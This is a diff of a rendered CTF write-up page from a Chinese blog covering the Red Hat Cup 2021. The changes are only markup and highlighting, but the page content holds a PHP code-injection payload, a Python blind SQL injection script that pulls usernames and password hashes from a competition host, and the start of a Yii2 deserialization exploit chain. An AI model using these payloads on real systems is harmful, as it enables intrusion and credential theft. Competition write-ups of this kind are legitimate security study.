@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>红帽杯2021 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -272,7 +272,7 @@ Here is what you want:1ndexx.php
 </code></pre><p><code>.1ndexx.php.swp</code></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -326,7 +326,7 @@ Here is what you want:1ndexx.php
 </span><span class="lnt">52
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nv">$link</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span> <span class="nv">$link</span> <span class="o">=</span> <span class="nx">mysql_connect</span><span class="p">(</span><span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">);</span> <span class="cp">?&gt;</span><span class="err">
 </span><span class="err">&lt;html&gt;
 </span><span class="err">&lt;head&gt;
 </span><span class="err">	&lt;title&gt;Hello worldd!&lt;/title&gt;
@@ -384,10 +384,10 @@ Here is what you want:1ndexx.php
 <p>payload</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">code</span><span class="o">=&lt;?=</span><span class="nx">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">code</span><span class="o">=&lt;?=</span><span class="nx">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
 </span></code></pre></td></tr></table></div>
 </div>
 </div><p>预期解应该是类似<code>show_source</code>的函数，当时比赛也确实想到了，但是使用<code>show_source(__FILE__)</code>却没有出，就转而使用phpinfo，没想到拼接字符串直接高亮<code>flag.php</code></p>
@@ -396,7 +396,7 @@ Here is what you want:1ndexx.php
 <p>exp</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -433,7 +433,7 @@ Here is what you want:1ndexx.php
 </span><span class="lnt">35
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="kn">as</span> <span class="nn">req</span>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">req</span>
 <span class="kn">import</span> <span class="nn">time</span>
 <span class="n">target</span> <span class="o">=</span> <span class="s2">&#34;http://eci-2zeir5o8p6vh7tzmqpxt.cloudeci1.ichunqiu.com/image.php?id=&#34;</span>
 <span class="n">flag</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
@@ -449,24 +449,24 @@ Here is what you want:1ndexx.php
         <span class="c1"># sql = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34; # images,users</span>
         <span class="c1"># sql = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;&#34; # username,password</span>
         <span class="n">sql</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(username,&#39;:&#39;,password) from users &#34;</span> <span class="c1"># admin:b87889146155b52d7d94e</span>
-        <span class="n">SQL</span> <span class="o">=</span> <span class="n">f</span><span class="s2">&#34;5 OR ASCII(substr(({sql}),{j},1))&gt;{mid}#&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="s2">&#34;/**/&#34;</span><span class="p">)</span>
+        <span class="n">SQL</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;5 OR ASCII(substr((</span><span class="si">{</span><span class="n">sql</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">j</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">#&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34; &#34;</span><span class="p">,</span> <span class="s2">&#34;/**/&#34;</span><span class="p">)</span>
         <span class="n">res</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">target</span><span class="o">+</span><span class="n">SQL</span><span class="p">)</span>
         <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.5</span><span class="p">)</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">SQL</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">SQL</span><span class="p">)</span>
         <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">res</span><span class="o">.</span><span class="n">text</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
             <span class="k">if</span> <span class="nb">max</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="nb">min</span><span class="p">:</span>
                 <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">max</span><span class="p">)</span>
-                <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
                 <span class="k">break</span>
             <span class="nb">min</span> <span class="o">=</span> <span class="n">mid</span>
         <span class="k">else</span><span class="p">:</span>
             <span class="k">if</span> <span class="nb">max</span> <span class="o">-</span> <span class="mi">1</span> <span class="o">==</span> <span class="nb">min</span><span class="p">:</span>
                 <span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="nb">min</span><span class="p">)</span>
-                <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+                <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
                 <span class="k">break</span>
             <span class="nb">max</span> <span class="o">=</span> <span class="n">mid</span>
     <span class="k">if</span> <span class="n">length</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">flag</span><span class="o">.</span><span class="n">strip</span><span class="p">()):</span>
-        <span class="k">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
+        <span class="nb">print</span><span class="p">(</span><span class="n">flag</span><span class="p">)</span>
         <span class="k">break</span>
 </code></pre></td></tr></table></div>
 </div>
@@ -476,7 +476,7 @@ Here is what you want:1ndexx.php
 <p>参考文章<a href="https://www.anquanke.com/post/id/217929" target="_blank" rel="noopener">https://www.anquanke.com/post/id/217929</a>直接exp一把梭</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -518,7 +518,7 @@ Here is what you want:1ndexx.php
 </span><span class="lnt">40
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
 <span class="k">namespace</span> <span class="nx">yii\rest</span><span class="p">{</span>
     <span class="k">class</span> <span class="nc">IndexAction</span> <span class="p">{</span>
         <span class="k">public</span> <span class="nv">$checkAccess</span><span class="p">;</span>
